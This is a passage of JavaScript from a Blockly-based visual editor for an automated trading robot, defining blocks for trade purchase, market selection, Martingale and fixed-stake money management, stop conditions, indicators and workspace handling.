  var e = m.getFieldValue("account_nya");
  var f = m.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(m, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var n = m.getFieldValue("seldurationunit_nya");
  var i = a.valueToCode(m, "inpduration_nya", javascript.Order.ATOMIC);
  var j = a.valueToCode(m, "barrier_nya", javascript.Order.ATOMIC);
  var k = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + i + ",\"" + n + "\"," + j + ",0,0,0,0,0,0,0,0,0,0,0);";
  return k;
};
Blockly.defineBlocksWithJsonArray([{
  type: "write_log",
  message0: "Notify %1 Sound: %2 %3",
  args0: [{
    type: "field_dropdown",
    name: "color_nya",
    options: [["No Color", ""], ["Blue", "42a5f5"], ["Red", "f44336"], ["Green", "04AA6D"], ["Yellow", "ffbf00"]]
  }, {
    type: "field_dropdown",
    name: "sound_nya",
    options: [["Silent", "silent"], ["Announcement", "announcement"], ["Earned money", "earned-money"], ["Job done", "job-done"], ["Error", "error"], ["Severe error", "severe-error"]]
  }, {
    type: "input_value",
    name: "log_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.write_log = function (g, a) {
  var b = a.valueToCode(g, "log_nya", javascript.Order.ATOMIC);
  var c = g.getFieldValue("color_nya");
  var d = g.getFieldValue("sound_nya");
  var e;
  if (d == "silent") {
    e = "";
  } else {
    e = "document.getElementById(\"" + d + "\").play();";
  }
  e += "writeLog(\"#" + c + "\"," + b + ");";
  return e;
};
let Dd = [["Continuous Indices:Volatility 10 (1s) Index", "1HZ10V|Volatility 10 (1s) Index"], ["Continuous Indices:Volatility 10 Index", "R_10|Volatility 10 Index"], ["Continuous Indices:Volatility 25 (1s) Index", "1HZ25V|Volatility 25 (1s) Index"], ["Continuous Indices:Volatility 25 Index", "R_25|Volatility 25 Index"], ["Continuous Indices:Volatility 50 (1s) Index", "1HZ50V|Volatility 50 (1s) Index"], ["Continuous Indices:Volatility 50 Index", "R_50|Volatility 50 Index"], ["Continuous Indices:Volatility 75 (1s) Index", "1HZ75V|Volatility 75 (1s) Index"], ["Continuous Indices:Volatility 75 Index", "R_75|Volatility 75 Index"], ["Continuous Indices:Volatility 100 (1s) Index", "1HZ100V|Volatility 100 (1s) Index"], ["Continuous Indices:Volatility 100 Index", "R_100|Volatility 100 Index"], ["Continuous Indices:Volatility 150 (1s) Index", "1HZ150V|Volatility 150 (1s) Index"], ["Continuous Indices:Volatility 250 (1s) Index", "1HZ250V|Volatility 250 (1s) Index"], ["Daily Reset Indices:Bear Market Index", "RDBEAR|Bear Market Index"], ["Daily Reset Indices:Bull Market Index", "RDBULL|Bull Market Index"], ["Jump Indices:Jump 10 Index", "JD10|Jump 10 Index"], ["Jump Indices:Jump 25 Index", "JD25|Jump 25 Index"], ["Jump Indices:Jump 50 Index", "JD50|Jump 50 Index"], ["Jump Indices:Jump 75 Index", "JD75|Jump 75 Index"], ["Jump Indices:Jump 100 Index", "JD100|Jump 100 Index"], ["Step Indices:Step Index", "stpRNG|Step Index"], ["Crash/Boom Indices:Crash 300 Index", "CRASH300N|Crash 300 Index"], ["Crash/Boom Indices:Crash 500 Index", "CRASH500|Crash 500 Index"], ["Crash/Boom Indices:Crash 1000 Index", "CRASH1000|Crash 1000 Index"], ["Crash/Boom Indices:Boom 300 Index", "BOOM300N|Boom 300 Index"], ["Crash/Boom Indices:Boom 500 Index", "BOOM500|Boom 500 Index"], ["Crash/Boom Indices:Boom 1000 Index", "BOOM1000|Boom 1000 Index"], ["Major Pairs:AUD/JPY", "frxAUDJPY|AUD/JPY"], ["Major Pairs:AUD/USD", "frxAUDUSD|AUD/USD"], ["Major Pairs:EUR/AUD", "frxEURAUD|EUR/AUD"], ["Major Pairs:EUR/CHF", "frxEURCHF|EUR/CHF"], ["Major Pairs:EUR/GBP", "frxEURGBP|EUR/GBP"], ["Major Pairs:EUR/JPY", "frxEURJPY|EUR/JPY"], ["Major Pairs:EUR/USD", "frxEURUSD|EUR/USD"], ["Major Pairs:GBP/AUD", "frxGBPAUD|GBP/AUD"], ["Major Pairs:GBP/JPY", "frxGBPJPY|GBP/JPY"], ["Major Pairs:GBP/USD", "frxGBPUSD|GBP/USD"], ["Major Pairs:USD/CAD", "frxUSDCAD|USD/CAD"], ["Major Pairs:USD/CHF", "frxUSDCHF|USD/CHF"], ["Major Pairs:USD/JPY", "frxUSDJPY|USD/JPY"], ["Minor Pairs:AUD/CAD", "frxAUDCAD|AUD/CAD"], ["Minor Pairs:AUD/CHF", "frxAUDCHF|AUD/CHF"], ["Minor Pairs:AUD/NZD", "frxAUDNZD|AUD/NZD"], ["Minor Pairs:EUR/NZD", "frxEURNZD|EUR/NZD"], ["Minor Pairs:GBP/CAD", "frxGBPCAD|GBP/CAD"], ["Minor Pairs:GBP/CHF", "frxGBPCHF|GBP/CHF"], ["Minor Pairs:GBP/NOK", "frxGBPNOK|GBP/NOK"], ["Minor Pairs:GBP/NZD", "frxGBPNZD|GBP/NZD"], ["Minor Pairs:NZD/JPY", "frxNZDJPY|NZD/JPY"], ["Minor Pairs:NZD/USD", "frxNZDUSD|NZD/USD"], ["Minor Pairs:USD/MXN", "frxUSDMXN|USD/MXN"], ["Minor Pairs:USD/NOK", "frxUSDNOK|USD/NOK"], ["Minor Pairs:USD/PLN", "frxUSDPLN|USD/PLN"], ["Minor Pairs:USD/SEK", "frxUSDSEK|USD/SEK"], ["Asian indices:Australia 200", "OTC_AS51|Australia 200"], ["Asian indices:Hong Kong 50", "OTC_HSI|Hong Kong 50"], ["Asian indices:Japan 225", "OTC_N225|Japan 225"], ["European indices:Euro 50", "OTC_SX5E|Euro 50"], ["European indices:France 40", "OTC_FCHI|France 40"], ["European indices:Germany 40", "OTC_GDAXI|Germany 40"], ["European indices:Netherlands 25", "OTC_AEX|Netherlands 25"], ["European indices:Swiss 20", "OTC_SSMI|Swiss 20"], ["European indices:UK 100", "OTC_FTSE|UK 100"], ["American indices:US 500", "OTC_SPC|US 500"], ["American indices:US Tech 100", "OTC_NDX|US Tech 100"], ["American indices:Wall Street 30", "OTC_DJI|Wall Street 30"], ["Forex Basket:AUD Basket", "WLDAUD|AUD Basket"], ["Forex Basket:EUR Basket", "WLDEUR|EUR Basket"], ["Forex Basket:GBP Basket", "WLDGBP|GBP Basket"], ["Forex Basket:USD Basket", "WLDUSD|USD Basket"], ["Commodities Basket:Gold Basket", "WLDXAU|Gold Basket"], ["Metals:Gold/USD", "frxXAUUSD|Gold/USD"], ["Metals:Palladium/USD", "frxXPDUSD|Palladium/USD"], ["Metals:Platinum/USD", "frxXPTUSD|Platinum/USD"], ["Metals:Silver/USD", "frxXAGUSD|Silver/USD"], ["Cryptocurrencies:BTC/USD", "cryBTCUSD|BTC/USD"], ["Cryptocurrencies:ETH/USD", "cryETHUSD|ETH/USD"]];
Blockly.defineBlocksWithJsonArray([{
  type: "setmarket",
  message0: "Set Market to: %1",
  args0: [{
    type: "field_dropdown",
    name: "market_nya",
    options: Dd
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmarket = function (e, a) {
  var b = e.getFieldValue("market_nya");
  var c = "if(mainSymbol!=\"" + b.split("|")[0] + "\"){mainSymbol=\"" + b.split("|")[0] + "\";document.getElementById(\"lblMarket\").innerText=\"" + b.split("|")[1] + "\";forgetAllTicks();};";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtosmartmartingale",
  message0: "Set Money Management to Martingale %1 Back to initial stake ONLY after previous loss covered: %2 %3 Initial Stake: %4 Martingale Factor: %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_smart_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "initialstake_nya"
  }, {
    type: "input_value",
    name: "martingalefactor_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtosmartmartingale = function (g, a) {
  var b = g.getFieldValue("check_smart_nya") === "TRUE";
  var c = a.valueToCode(g, "initialstake_nya", javascript.Order.ATOMIC);
  var d = a.valueToCode(g, "martingalefactor_nya", javascript.Order.ATOMIC);
  var e = "selMoneyManagement.value=\"smartmartingale\";inpInitStake.value=" + c + ";inpMartiFactor.value=" + d + ";chkSmart.checked=" + b + ";selMoneyManagementChanged();";
  return e;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtosmartcyclestake",
  message0: "Set Money Management to Smart Cycle Stake %1 Back to initial stake ONLY after previous loss covered: %2 %3 Cycle Stake: %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_smart_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "cyclestake_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtosmartcyclestake = function (f, a) {
  var b = f.getFieldValue("check_smart_nya") === "TRUE";
  var c = a.valueToCode(f, "cyclestake_nya", javascript.Order.ATOMIC);
  var d = "selMoneyManagement.value=\"smartcyclestake\";inpCycleStake.value=" + c + ";chkSmart.checked=" + b + ";selMoneyManagementChanged();";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setmoneymanagementtofixedstake",
  message0: "Set Money Management to Fixed Stake %1 Fixed Stake: %2",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "fixedstake_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setmoneymanagementtofixedstake = function (e, a) {
  var b = a.valueToCode(e, "fixedstake_nya", javascript.Order.ATOMIC);
  var c = "stakeNow=" + b + ";selMoneyManagement.value=\"fixedstake\";inpInitStake.value=" + b + ";selMoneyManagementChanged();";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "settarget",
  message0: "Set Target (Stop Condition) %1 %2 Target Profit: %3 %4 Stop Loss: %5 %6 Number Of Win(s): %7 %8 Number Of Loss(es): %9 %10 Number Of Run(s): %11 %12 Win(s) In A Row: %13 %14 Loss(es) In A Row: %15",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_targetprofit_nya",
    checked: true
  }, {
    type: "input_value",
    name: "targetprofit_nya"
  }, {
    type: "field_checkbox",
    name: "check_stoploss_nya",
    checked: false
  }, {
    type: "input_value",
    name: "stoploss_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofwins_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofwins_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberoflosses_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberoflosses_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofruns_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofruns_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberofwinsinarow_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberofwinsinarow_nya"
  }, {
    type: "field_checkbox",
    name: "check_numberoflossesinarow_nya",
    checked: false
  }, {
    type: "input_value",
    name: "numberoflossesinarow_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.settarget = function (r, a) {
  var b = r.getFieldValue("check_targetprofit_nya") === "TRUE";
  var c = a.valueToCode(r, "targetprofit_nya", javascript.Order.ATOMIC);
  var d = r.getFieldValue("check_stoploss_nya") === "TRUE";
  var e = a.valueToCode(r, "stoploss_nya", javascript.Order.ATOMIC);
  var f = r.getFieldValue("check_numberofwins_nya") === "TRUE";
  var g = a.valueToCode(r, "numberofwins_nya", javascript.Order.ATOMIC);
  var h = r.getFieldValue("check_numberoflosses_nya") === "TRUE";
  var i = a.valueToCode(r, "numberoflosses_nya", javascript.Order.ATOMIC);
  var j = r.getFieldValue("check_numberofruns_nya") === "TRUE";
  var k = a.valueToCode(r, "numberofruns_nya", javascript.Order.ATOMIC);
  var l = r.getFieldValue("check_numberofwinsinarow_nya") === "TRUE";
  var m = a.valueToCode(r, "numberofwinsinarow_nya", javascript.Order.ATOMIC);
  var n = r.getFieldValue("check_numberoflossesinarow_nya") === "TRUE";
  var o = a.valueToCode(r, "numberoflossesinarow_nya", javascript.Order.ATOMIC);
  var p = "chkTP.checked=" + b + ";inpTP.value=" + c + ";chkSL.checked=" + d + ";inpSL.value=" + e + ";chkNumOfWin.checked=" + f + ";inpNumOfWin.value=" + g + ";chkNumOfLoss.checked=" + h + ";inpNumOfLoss.value=" + i + ";chkNumOfRun.checked=" + j + ";inpNumOfRun.value=" + k + ";chkNumOfWinInARow.checked=" + l + ";inpNumOfWinInARow.value=" + m + ";chkNumOfLossInARow.checked=" + n + ";inpNumOfLossInARow.value=" + o + ";";
  return p;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setvirtuallose",
  message0: "Set Virtual Lose %1 %2 Virtual Lose: %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_virtuallose_nya",
    checked: true
  }, {
    type: "input_value",
    name: "virtuallose_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setvirtuallose = function (f, a) {
  var b = f.getFieldValue("check_virtuallose_nya") === "TRUE";
  var c = a.valueToCode(f, "virtuallose_nya", javascript.Order.ATOMIC);
  var d = "chkVLose.checked=" + b + ";inpVLose.value=" + c + ";cekValidasiSlaveToken();";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "setadditionalsettings",
  message0: "Set Additional Settings %1 %2 Delay After Win (seconds): %3 %4 Delay After Lose (seconds): %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_delayafterwin_nya",
    checked: false
  }, {
    type: "input_value",
    name: "delayafterwin_nya"
  }, {
    type: "field_checkbox",
    name: "check_delayafterlose_nya",
    checked: true
  }, {
    type: "input_value",
    name: "delayafterlose_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setadditionalsettings = function (h, a) {
  var b = h.getFieldValue("check_delayafterwin_nya") === "TRUE";
  var c = h.getFieldValue("delayafterwin_nya");
  var d = h.getFieldValue("check_delayafterlose_nya") === "TRUE";
  var e = h.getFieldValue("delayafterlose_nya");
  var f = "chkDelayWin.checked=" + b + ";inpDelayWin.value=" + c + ";chkDelayLose.checked=" + d + ";inpDelayLose.value=" + e + ";";
  return f;
};
Blockly.defineBlocksWithJsonArray([{
  type: "resultis",
  message0: "Result is %1",
  args0: [{
    type: "field_dropdown",
    name: "result_nya",
    options: [["Win", "win"], ["Loss", "loss"], ["Virtual Win", "virtualwin"], ["Virtual Loss", "virtualloss"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.resultis = function (e, a) {
  var b = e.getFieldValue("result_nya");
  var c = "lastCont_result==\"" + b + "\"";
  return [c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "readyfortrade",
  message0: "Ready For Trade",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: "",
  extensions: ["readyfortrade_onchange"]
}]);
javascript.javascriptGenerator.forBlock.readyfortrade = function (c, a) {
  return "izinRun2=true;";
};
Blockly.Extensions.register("readyfortrade_onchange", function () {
  this.setOnChange(function (d) {
    if (this.workspace.isDragging()) {
      return;
    }
    let a;
    let e;
    a = this.getSurroundParent();
    e = false;
    while (a !== null) {
      if (a.type === "runonceatstart") {
        e = true;
        break;
      }
      ;
      a = a.getSurroundParent();
    }
    if (!e) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Ready For Trade\" must inside BLOCK 1");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "checkagain",
  message0: "Check Again",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: "",
  extensions: ["checkagain_onchange"]
}]);
javascript.javascriptGenerator.forBlock.checkagain = function (c, a) {
  return "izinRun2=true;";
};
Blockly.Extensions.register("checkagain_onchange", function () {
  this.setOnChange(function (d) {
    if (this.workspace.isDragging()) {
      return;
    }
    let a;
    let e;
    a = this.getSurroundParent();
    e = false;
    while (a !== null) {
      if (a.type === "purchaseconditions") {
        e = true;
        break;
      }
      ;
      a = a.getSurroundParent();
    }
    if (!e) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Check Again\" must inside BLOCK 2");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "tradeagain",
  message0: "Trade Again",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: "",
  extensions: ["tradeagain_onchange"]
}]);
javascript.javascriptGenerator.forBlock.tradeagain = function (c, a) {
  return "izinRun2=true;";
};
Blockly.Extensions.register("tradeagain_onchange", function () {
  this.setOnChange(function (d) {
    if (this.workspace.isDragging()) {
      return;
    }
    let a;
    let e;
    a = this.getSurroundParent();
    e = false;
    while (a !== null) {
      if (a.type === "restarttradingconditions") {
        e = true;
        break;
      }
      ;
      a = a.getSurroundParent();
    }
    if (!e) {
      this.previousConnection.disconnect();
      this.setWarningText("\"Trade Again\" must inside BLOCK 4");
    } else {
      this.setWarningText(null);
    }
  });
});
Blockly.defineBlocksWithJsonArray([{
  type: "stopbot",
  message0: "Stop Robot",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.stopbot = function (c, a) {
  return "if(btn_run.src.split(\"/\").pop() == \"icon_stop.png\"){btn_run.click();}";
};
Blockly.defineBlocksWithJsonArray([{
  type: "balance",
  message0: "Balance: %1",
  args0: [{
    type: "field_dropdown",
    name: "tipe_nya",
    options: [["Number", "number"], ["String", "string"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.balance = function (e, a) {
  var b = e.getFieldValue("tipe_nya");
  var c = "";
  if (b == "string") {
    c = "\"" + Mb.innerText.split(" ")[0] + "\"";
  } else {
    c = "summary_balance.innerText.split(\" \")[0]*1";
  }
  return [c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "summary",
  message0: "Summary: %1",
  args0: [{
    type: "field_dropdown",
    name: "data_nya",
    options: [["No. Of Runs", "noofruns"], ["Total Stake", "totalstake"], ["Total Payout", "totalpayout"], ["No. Of Win(s)", "win"], ["No. Of Loss(es)", "loss"], ["Total Profit/Loss", "totalprofitloss"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.summary = function (e, a) {
  var b = e.getFieldValue("data_nya");
  var c = "summary_" + b + ".innerText*1";
  return [c, Blockly.JavaScript.ORDER_NONE];
};
const Ed = c => {
  return new Promise(a => // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(a, c));
};
Blockly.defineBlocksWithJsonArray([{
  type: "runafter",
  message0: "%1 Run After %2 Second(s)",
  args0: [{
    type: "input_statement",
    name: "statement_nya"
  }, {
    type: "input_value",
    name: "seconds_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.runafter = function (f, a) {
  var b = a.statementToCode(f, "statement_nya");
  var c = a.valueToCode(f, "seconds_nya", javascript.Order.ATOMIC);
  var d = "sleep(" + c * 1000 + ").then(() => {" + b + ";})";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorsmaarray",
  message0: "Simple Moving Average Array %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorsmaarray = function (f, a) {
  var b = a.valueToCode(f, "inputlist_nya", javascript.Order.ATOMIC);
  var c = a.valueToCode(f, "period_nya", javascript.Order.ATOMIC);
  var d = "calculateMovingAverage(" + b + "," + c + ")";
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorrsi",
  message0: "Relative Strength Index %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorrsi = function (f, a) {
  var b = a.valueToCode(f, "inputlist_nya", javascript.Order.ATOMIC);
  var c = a.valueToCode(f, "period_nya", javascript.Order.ATOMIC);
  var d = "calculateRSI(" + b + "," + c + ")";
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "indicatorbollingerbands",
  message0: "Bollinger Bands [Upper,Middle,Lower] %1 Input List %2 Period %3 Standard Deviation %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }, {
    type: "input_value",
    name: "stddev_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.indicatorbollingerbands = function (g, a) {
  var b = a.valueToCode(g, "inputlist_nya", javascript.Order.ATOMIC);
  var c = a.valueToCode(g, "period_nya", javascript.Order.ATOMIC);
  var d = a.valueToCode(g, "stddev_nya", javascript.Order.ATOMIC);
  var e = "calculateBollingerBands(" + b + "," + c + "," + d + ")";
  return [e, Blockly.JavaScript.ORDER_NONE];
};
const Fd = () => {
  if (confirm("Click OK if you're sure to reset the block. Otherwise, click CANCEL.")) {
    Blockly.getMainWorkspace().clear();
    Blockly.serialization.workspaces.load({
      blocks: {
        languageVersion: 0,
        blocks: [{
          type: "runonceatstart",
          id: "RLoGFD/l:WR[I^uo*+k3",
          x: 10,
          y: 10,
          inputs: {
            statement_runonceatstart: {
              block: {
                type: "readyfortrade",
                id: "/S?3[Ux8c2wQ.UR3dBEo"
              }
            }
          }
        }, {
          type: "purchaseconditions",
          id: "|!|d5xn:=b08sQWUU0Av",
          x: 10,
          y: 107,
          inputs: {
            statement_purchaseconditions: {
              block: {
                type: "controls_if",
                id: "mApwxUtfhpdSi`3D8xoD",
                extraState: {
                  hasElse: true
                },
                inputs: {
                  ELSE: {
                    block: {
                      type: "checkagain",
                      id: "h:5~S!I;5F0a:qF-Ek(s"
                    }
                  }
                }
              }
            }
          }
        }, {
          type: "restarttradingconditions",
          id: "A)}IH]$#NmR6#$VO9}l:",
          x: 10,
          y: 279,
          inputs: {
            statement_restarttradingconditions: {
              block: {
                type: "tradeagain",
                id: "e!!=/,E4OwxaR#GpVE"
              }
            }
          }
        }]
      }
    }, Blockly.getMainWorkspace());
    localStorage.setItem("mainRobotName", "-");
    Nb.innerText = "Robot : -";
  }
};
if (localStorage.getItem("blockly_workspace_state") != null) {
  Blockly.serialization.workspaces.load(JSON.parse(localStorage.getItem("blockly_workspace_state")), Blockly.getMainWorkspace());
} else {
  Blockly.serialization.workspaces.load({
    blocks: {
      languageVersion: 0,
      blocks: [{
        type: "runonceatstart",
        id: "RLoGFD/l:WR[I^uo*+k3",
        x: 10,
        y: 10,
        inputs: {
          statement_runonceatstart: {
            block: {
              type: "readyfortrade",
              id: "/S?3[Ux8c2wQ.UR3dBEo"
            }
          }
        }
      }, {
        type: "purchaseconditions",
        id: "|!|d5xn:=b08sQWUU0Av",
        x: 10,
        y: 107,
        inputs: {
          statement_purchaseconditions: {
            block: {
              type: "controls_if",
              id: "mApwxUtfhpdSi`3D8xoD",
              extraState: {
                hasElse: true
              },
              inputs: {
                ELSE: {
                  block: {
                    type: "checkagain",
                    id: "h:5~S!I;5F0a:qF-Ek(s"
                  }
                }
              }
            }
          }
        }
      }, {
        type: "restarttradingconditions",
        id: "A)}IH]$#NmR6#$VO9}l:",
        x: 10,
        y: 279,
        inputs: {
          statement_restarttradingconditions: {
            block: {
              type: "tradeagain",
              id: "e!!=/,E4OwxaR#GpVE"
            }
          }
        }
      }]
    }
  }, Blockly.getMainWorkspace());
}
const Gd = () => {
  const b = Blockly.serialization.workspaces.save(Blockly.getMainWorkspace());
  rd(b, "myblock.block");
};
const Hd = c => {
  const a = Blockly.serialization.workspaces.save(Blockly.getMainWorkspace());
  localStorage.setItem("blockly_workspace_state", JSON.stringify(a));
};
const Id = () => {
  Blockly.getMainWorkspace().undo(false);
};
const Jd = () => {
  Blockly.getMainWorkspace().undo(true);
};
const Kd = () => {
  Blockly.getMainWorkspace().cleanUp();
};
Ld(document.getElementById("mydivSummary"));
Ld(document.getElementById("mydivLog"));
function Ld(i) {
  var a = 0;
  var j = 0;
  var k = 0;
  var l = 0;
  if (document.getElementById(i.id + "header")) {
    document.getElementById(i.id + "header").onmousedown = m;
  } else {
    i.onmousedown = m;
  }
  function m(b) {
    b = b || window.event;
    b.preventDefault();
    k = b.clientX;
    l = b.clientY;
    document.onmouseup = g;
    document.onmousemove = f;
  }
  function f(b) {
    b = b || window.event;
    b.preventDefault();
    a = k - b.clientX;
    j = l - b.clientY;
    k = b.clientX;
    l = b.clientY;
    i.style.top = i.offsetTop - j + "px";
    i.style.left = i.offsetLeft - a + "px";
    if (i.offsetTop < i.offsetHeight * 0.5) {
      i.style.top = i.offsetHeight * 0.5 + "px";
    }
    if (i.offsetLeft < -i.offsetWidth * 0.4) {
      i.style.left = -i.offsetWidth * 0.4 + "px";
    }
  }
  function g() {
    document.onmouseup = null;
    document.onmousemove = null;
  }
}
const Md = () => {
  document.getElementById("mydivLog").style.zIndex = 101;
  document.getElementById("mydivSummary").style.zIndex = 102;
};
const Nd = () => {
  document.getElementById("mydivSummary").style.zIndex = 101;
  document.getElementById("mydivLog").style.zIndex = 102;
};
const Od = () => {
  let b = false;
  for (we = 0; we < u.length; we++) {
    if (u[we] != 0) {
      b = true;
      break;
    }
    ;
  }
  ;
  if (b) {
    $b("", "Wait until all transaction finished.");
    return;
  }
  if (confirm("This will clear all transactions in the summary panel, and all counters will be reset to zero.")) {
    document.getElementById("tableSummaryTBODY").innerHTML = "<tr id=\"tableSummaryTRATAS\"><th style=\"width: 190px;\">Timestamp</th><th>Trade Type</th><th>Entry Spot</th><th>Exit Spot</th><th>Buy Price</th><th>Profit/Loss</th></tr>";
    Gb.innerText = Hb.innerText = Ib.innerText = Jb.innerText = Kb.innerText = Lb.innerText = 0;
    A = 0;
    v = [];
    w = [];
    va = 0;
    wa = 0;
  }
};
const Pd = () => {
  document.getElementById("mydivSummary").style.display = "block";
  Md();
};
const Qd = () => {
  document.getElementById("mydivSummary").style.display = "none";
};
Qd();
const Rd = () => {
  document.getElementById("tableLogTBODY").innerHTML = "<tr><td style=\"width: 25%;\"></td><td></td></tr>";
};
const Sd = () => {
  document.getElementById("mydivLog").style.display = "flex";
  Nd();
};
const Td = () => {
  document.getElementById("mydivLog").style.display = "none";
};
Td();
const Ud = () => {
  if (document.getElementById("btn_hideshowsidebar").src.split("/").pop() === "icon_hidesidebar.png") {
    document.getElementById("btn_hideshowsidebar").src = "image/icon_showsidebar.png";
    document.getElementById("body_main").style.gridTemplateColumns = "0% 0% auto";
  } else {
    document.getElementById("btn_hideshowsidebar").src = "image/icon_hidesidebar.png";
    document.getElementById("body_main").style.gridTemplateColumns = "0% 170px auto";
  }
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
};
const Vd = () => {
  if (document.getElementById("btn_hideshowdatabox").src.split("/").pop() === "icon_hidedatabox.png") {
    document.getElementById("btn_hideshowdatabox").src = "image/icon_showdatabox.png";
    document.getElementById("body_main").style.gridTemplateRows = "7% 93% 0%";
  } else {
    document.getElementById("btn_hideshowdatabox").src = "image/icon_hidedatabox.png";
    document.getElementById("body_main").style.gridTemplateRows = "7% 46.5% 46.5%";
  }
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
};
const Wd = () => {
  if (document.getElementById("btn_hideshowtoolbox").src.split("/").pop() === "icon_hidetoolbox.png") {
    document.getElementById("btn_hideshowtoolbox").src = "image/icon_showtoolbox.png";
    Blockly.getMainWorkspace().getToolbox().setVisible(false);
  } else {
    document.getElementById("btn_hideshowtoolbox").src = "image/icon_hidetoolbox.png";
    Blockly.getMainWorkspace().getToolbox().setVisible(true);
  }
  // TOLOOK
  // TOLOOK
  // TOLOOK
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
